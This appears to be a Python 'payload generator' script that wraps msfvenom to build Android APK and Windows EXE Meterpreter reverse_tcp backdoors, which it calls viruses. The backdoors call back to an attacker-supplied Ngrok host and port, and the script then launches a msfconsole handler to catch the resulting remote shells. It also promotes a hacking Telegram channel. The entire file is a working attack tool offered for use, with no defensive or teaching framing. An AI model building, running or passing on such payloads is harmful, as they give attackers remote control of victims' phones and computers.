import os
import time

stay30 = 30
stay20 = 20
stay10 = 10
stay5 = 5
stay2 = 2

os.system('clear')
os.system('pip install pyfiglet')
os.system('clear')
os.system('pip install lolcat')
os.system('clear')
os.system('figlet Abishim-P.G | lolcat')

print("""
|--------------------------------------------------------------|
|  ----------Welcome To Abishim Payload GeneratorV1.1--------  |
|                                                              |
|    1.android/meterpreter/reverse_tcp                         |
|    2.windows/meterpreter/reverse_tcp                         |
|    3.windows/x64/meterpreter/reverse_tcp                     |
|                                                              |
|  ----Telegram Channel : https://t.me/hackjourneyCHANNEL ---  |
|--------------------------------------------------------------|
""")
select = input('Select Payload : ')
host = input('Ngrok IP : ')
port = input('Ngrok Port : ')
lport = input('Local Port : ')
name = input('Virus Name : ')
os.system('clear')
os.system('figlet Loading... | lolcat')

if select == '1':
    payload = f'msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o /root/Desktop/Abishim_{name}.apk'
    os.system(payload)
    time.sleep(stay5)
    os.system('clear')
    os.system('figlet Completed... | lolcat')
    time.sleep(stay2)
    os.system('clear')
    os.system('figlet Virus Info | lolcat')
    info = f'Your Payload Number :{select}\nYour LHost :{host}\nYour Ngrok Port :{port}\nYour Virus Name :{name}'
    print(info)
    time.sleep(stay5)
    os.system('clear')
    os.system('figlet Start Listening | lolcat')
    msfconsole = f'msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT {lport}; exploit"'
    os.system(msfconsole)

elif select == '2':
    payload = f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > /root/Desktop/Abishim_{name}.exe'
    os.system(payload)
    os.system('clear')
    os.system('figlet Completed... | lolcat')
    time.sleep(stay2)
    os.system('clear')
    os.system('figlet Virus Info | lolcat')
    info = f'Your Payload Number :{select}\nYour LHost :{host}\nYour Ngrok Port :{port}\nYour Virus Name :{name}'
    print(info)
    time.sleep(stay5)
    os.system('clear')
    os.system('figlet Start Listening | lolcat')
    msfconsole = f'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT {lport}; exploit"'
    os.system(msfconsole)

elif select == '3':
    payload = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > /root/Desktop/Abishim_{name}.exe'
    os.system(payload)
    os.system('clear')
    os.system('figlet Completed... | lolcat')
    time.sleep(stay2)
    os.system('clear')
    os.system('figlet Virus Info | lolcat')
    info = f'Your Payload Number :{select}\nYour LHost :{host}\nYour Ngrok Port :{port}\nYour Virus Name :{name}'
    print(info)
    time.sleep(stay5)
    os.system('clear')
    os.system('figlet Start Listening | lolcat')
    msfconsole = f'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT {lport}; exploit"'
    os.system(msfconsole)

